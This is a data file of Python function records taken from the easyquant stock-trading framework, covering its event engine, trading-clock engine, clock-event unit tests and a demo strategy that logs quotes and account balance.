{"docstring": "\"\"\"\u521d\u59cb\u5316\u4e8b\u4ef6\u5f15\u64ce\"\"\"\n# \u4e8b\u4ef6\u961f\u5217\n", "func_signal": "def __init__(self):\n", "code": "self.__queue = Queue()\n\n# \u4e8b\u4ef6\u5f15\u64ce\u5f00\u5173\nself.__active = False\n\n# \u4e8b\u4ef6\u5f15\u64ce\u5904\u7406\u7ebf\u7a0b\nself.__thread = Thread(target=self.__run, name=\"EventEngine.__thread\")\n\n# \u4e8b\u4ef6\u5b57\u5178\uff0ckey \u4e3a\u65f6\u95f4\uff0c value \u4e3a\u5bf9\u5e94\u76d1\u542c\u4e8b\u4ef6\u51fd\u6570\u7684\u5217\u8868\nself.__handlers = defaultdict(list)", "path": "easyquant/easyquant/event_engine.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "# \u975e\u4ea4\u6613\u89e6\u53d1, \u975e\u4ea4\u6613\u9636\u6bb5\n", "func_signal": "def test_register_clock_interval_not_trading_false(self):\n", "code": "trading = False\nbegin = datetime.datetime.combine(\n    self.trade_date,\n    datetime.time(15, 15, 0, tzinfo=tz.tzlocal())\n)\n# \u786e\u8ba4\u5728\u4ea4\u6613\u4e2d\nself.register_clock_interval(begin, trading, 1)\nself.assertFalse(self.clock_engine.trading_state)", "path": "easyquant/unitest_demo.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "# for receive quit signal\n", "func_signal": "def wait(self):\n", "code": "for _ in range(int(self.PushInterval) + 1):\n    time.sleep(1)", "path": "easyquant/easyquant/push_engine/base_engine.py", "commit_date": "2016-09-22 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\n\u6d4b\u8bd5 tick \u4e2d\u7684\u65f6\u95f4\u95f4\u9694\u4e8b\u4ef6\n\u65f6\u95f4\u95f4\u9694\u4e8b\u4ef6\n\u4ece\u5f00\u59cb\u524d1\u5206\u949f\u4e00\u76f4\u5230\u6536\u5e02\u540e1\u5206\u949f, \u89e6\u53d1\u6240\u6709\u7684\u5df2\u5b9a\u4e49\u65f6\u949f\u4e8b\u4ef6\n:return:\n\"\"\"\n# \u5404\u4e2a\u65f6\u95f4\u95f4\u9694\u7684\u89e6\u53d1\u6b21\u6570\u8ba1\u6570\n", "func_signal": "def test_tick_interval_event(self):\n", "code": "counts = self.counts\n\ndef count(event):\n    # \u65f6\u949f\u5f15\u64ce\u5fc5\u5b9a\u5728\u4e0a\u8ff0\u7684\u7c7b\u578b\u4e2d\n    self.assertIn(event.data.clock_event, counts)\n    # \u8ba1\u6570\n    counts[event.data.clock_event].append(self.clock_engine.now_dt)\n\n# \u6ce8\u518c\u4e00\u4e2a\u54cd\u5e94\u65f6\u949f\u4e8b\u4ef6\u7684\u51fd\u6570\nself.main_engine.event_engine.register(ClockEngine.EventType, count)\n\n# \u5f00\u542f\u4e8b\u4ef6\u5f15\u64ce\nself.main_engine.event_engine.start()\n\n# \u6a21\u62df\u4ece\u5f00\u5e02\u524d1\u5206\u949f, \u53738:59\u5206, \u5230\u4f11\u5e02\u540e1\u5206\u949f\u7684\u6bcf\u79d2\u4f20\u5165\u65f6\u949f\u63a5\u53e3\nbegin = datetime.datetime.combine(\n    self.trade_date,\n    datetime.time(8, 59, tzinfo=self.clock_engine.tzinfo)\n)\nhours = 15 - 9\nmins = hours * 60 + 2\nseconds = 60 * mins\nfor secs in range(seconds):\n    now = begin + datetime.timedelta(seconds=secs)\n    time.time = mock.Mock(return_value=now.timestamp())\n    self.clock_engine.tock()\n    time.sleep(0.001)\n\n# \u7b49\u5f85\u4e8b\u4ef6\u5f15\u64ce\u5904\u7406\nself.main_engine.event_engine.stop()\n\n# \u6838\u5bf9\u6b21\u6570, \u4f11\u5e02\u7684\u65f6\u5019\u4e0d\u4f1a\u7edf\u8ba1\nself.assertEqual(len(counts[60]), 15 - 9 + 1 - len([\"9:00\"]))\nself.assertEqual(len(counts[30]), (15 - 9) * 2 + 1 - len([\"9:00\"]))\nself.assertEqual(len(counts[15]), (15 - 9) * 4 + 1 -\n                 len([\"9:00\"]))", "path": "easyquant/unitest_demo.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "# \u4ea4\u6613\u89e6\u53d1, \u4ea4\u6613\u9636\u6bb5\n", "func_signal": "def test_register_clock_interval_trading_true(self):\n", "code": "trading = True\nbegin = datetime.datetime.combine(\n    self.trade_date,\n    datetime.time(9, 15, 0, tzinfo=tz.tzlocal())\n)\n# \u786e\u8ba4\u5728\u4ea4\u6613\u4e2d\nself.register_clock_interval(begin, trading, 1)\nself.assertTrue(self.clock_engine.trading_state)", "path": "easyquant/unitest_demo.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\n\u6240\u6709\u7b56\u7565\u8981\u76d1\u542c\u7684\u4e8b\u4ef6\u90fd\u7ed1\u5b9a\u5230\u8fd9\u91cc\n:param strategy: Strategy()\n:param _type: \"listen\" OR \"unlisten\"\n:return:\n\"\"\"\n", "func_signal": "def strategy_listen_event(self, strategy, _type=\"listen\"):\n", "code": "func = {\n    \"listen\": self.event_engine.register,\n    \"unlisten\": self.event_engine.unregister,\n}.get(_type)\n\n# \u884c\u60c5\u5f15\u64ce\u7684\u4e8b\u4ef6\nfor quotation_engine in self.quotation_engines:\n    func(quotation_engine.EventType, strategy.run)\n\n# \u65f6\u949f\u4e8b\u4ef6\nfunc(ClockEngine.EventType, strategy.clock)", "path": "easyquant/easyquant/main_engine.py", "commit_date": "2016-09-29 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\u6ce8\u518c\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u76d1\u542c\"\"\"\n", "func_signal": "def register(self, event_type, handler):\n", "code": "if handler not in self.__handlers[event_type]:\n    self.__handlers[event_type].append(handler)", "path": "easyquant/easyquant/event_engine.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\":param event event.data \u4e3a\u6240\u6709\u80a1\u7968\u7684\u4fe1\u606f\uff0c\u7ed3\u6784\u5982\u4e0b\n{'162411':\n{'ask1': '0.493',\n 'ask1_volume': '75500',\n 'ask2': '0.494',\n 'ask2_volume': '7699281',\n 'ask3': '0.495',\n 'ask3_volume': '2262666',\n 'ask4': '0.496',\n 'ask4_volume': '1579300',\n 'ask5': '0.497',\n 'ask5_volume': '901600',\n 'bid1': '0.492',\n 'bid1_volume': '10765200',\n 'bid2': '0.491',\n 'bid2_volume': '9031600',\n 'bid3': '0.490',\n 'bid3_volume': '16784100',\n 'bid4': '0.489',\n 'bid4_volume': '10049000',\n 'bid5': '0.488',\n 'bid5_volume': '3572800',\n 'buy': '0.492',\n 'close': '0.499',\n 'high': '0.494',\n 'low': '0.489',\n 'name': '\u534e\u5b9d\u6cb9\u6c14',\n 'now': '0.493',\n 'open': '0.490',\n 'sell': '0.493',\n 'turnover': '420004912',\n 'volume': '206390073.351'}}\n\"\"\"\n# \u4f7f\u7528 self.user \u6765\u64cd\u4f5c\u8d26\u6237\uff0c\u7528\u6cd5\u540c easytrader \u7528\u6cd5\n# \u4f7f\u7528 self.log.info('message') \u6765\u6253\u5370\u4f60\u6240\u9700\u8981\u7684 log\n", "func_signal": "def strategy(self, event):\n", "code": "print('demo1 \u7684 log \u4f7f\u7528\u81ea\u5b9a\u4e49 log \u7684\u65b9\u5f0f\u8bb0\u5f55\u5728 demo1.log')\nself.log.info('\\n\\n\u7b56\u75651\u89e6\u53d1')\nself.log.info('\u884c\u60c5\u6570\u636e: \u4e07\u79d1\u4ef7\u683c: %s' % event.data['000002'])\nself.log.info('\u68c0\u67e5\u6301\u4ed3')\nself.log.info(self.user.balance)\nself.log.info('\\n')", "path": "easyquant/strategies/\u7b56\u75651_Demo.py", "commit_date": "2016-08-19 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\u5728\u4ea4\u6613\u65f6\u95f4\u4f1a\u5b9a\u65f6\u63a8\u9001 clock \u4e8b\u4ef6\n:param event: event.data.clock_event \u4e3a [0.5, 1, 3, 5, 15, 30, 60] \u5355\u4f4d\u4e3a\u5206\u949f,  ['open', 'close'] \u4e3a\u5f00\u5e02\u3001\u6536\u5e02\n    event.data.trading_state  bool \u662f\u5426\u5904\u4e8e\u4ea4\u6613\u65f6\u95f4\n\"\"\"\n", "func_signal": "def clock(self, event):\n", "code": "if event.data.clock_event == 'open':\n    # \u5f00\u5e02\u4e86\n    self.log.info('open')\nelif event.data.clock_event == 'close':\n    # \u6536\u5e02\u4e86\n    self.log.info('close')\nelif event.data.clock_event == 5:\n    # 5 \u5206\u949f\u7684 clock\n    self.log.info(\"5\u5206\u949f\")", "path": "easyquant/strategies/\u7b56\u75651_Demo.py", "commit_date": "2016-08-19 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "# \u4ea4\u6613\u89e6\u53d1, \u975e\u4ea4\u6613\u9636\u6bb5\n", "func_signal": "def test_register_clock_interval_not_trading_true(self):\n", "code": "trading = True\nbegin = datetime.datetime.combine(\n    self.trade_date,\n    datetime.time(15, 15, 0, tzinfo=tz.tzlocal())\n)\n# \u786e\u8ba4\u5728\u4ea4\u6613\u4e2d\nself.register_clock_interval(begin, trading, 0)\nself.assertFalse(self.clock_engine.trading_state)", "path": "easyquant/unitest_demo.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\n:param event_engine:\n:param event_engine: tzinfo\n:return:\n\"\"\"\n# \u9ed8\u8ba4\u4f7f\u7528\u5f53\u5730\u65f6\u95f4\u7684\u65f6\u533a\n", "func_signal": "def __init__(self, event_engine, tzinfo=None):\n", "code": "self.tzinfo = tzinfo or tz.tzlocal()\n\nself.event_engine = event_engine\nself.is_active = True\nself.clock_engine_thread = Thread(target=self.clocktick, name=\"ClockEngine.clocktick\")\nself.sleep_time = 1\nself.trading_state = True if (etime.is_tradetime(datetime.datetime.now()) and etime.is_trade_date(datetime.datetime.now())) else False\nself.clock_moment_handlers = deque()\nself.clock_interval_handlers = set()\n\nself._init_clock_handler()", "path": "easyquant/easyquant/push_engine/clock_engine.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\n\u6ce8\u518c\u9ed8\u8ba4\u7684\u65f6\u949f\u4e8b\u4ef6\n:return:\n\"\"\"\n\n# \u5f00\u76d8\u4e8b\u4ef6\n", "func_signal": "def _init_clock_handler(self):\n", "code": "def _open():\n    self.trading_state = True\n\nself._register_moment('open', datetime.time(9, tzinfo=self.tzinfo), makeup=True, call=_open)\n\n# \u4e2d\u5348\u4f11\u5e02\nself._register_moment('pause', datetime.time(11, 30, tzinfo=self.tzinfo), makeup=True)\n\n# \u4e0b\u5348\u5f00\u76d8\nself._register_moment('continue', datetime.time(13, tzinfo=self.tzinfo), makeup=True)\n\n# \u6536\u76d8\u4e8b\u4ef6\ndef close():\n    self.trading_state = False\n\nself._register_moment('close', datetime.time(15, tzinfo=self.tzinfo), makeup=True, call=close)\n\n# \u95f4\u9694\u4e8b\u4ef6\nfor interval in (0.5, 1, 5, 15, 30, 60):\n    self.register_interval(interval)", "path": "easyquant/easyquant/push_engine/clock_engine.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\u6ce8\u9500\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\"\"\"\n", "func_signal": "def unregister(self, event_type, handler):\n", "code": "handler_list = self.__handlers.get(event_type)\nif handler_list is None:\n    return\nif handler in handler_list:\n    handler_list.remove(handler)\nif len(handler_list) == 0:\n    self.__handlers.pop(event_type)", "path": "easyquant/easyquant/event_engine.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
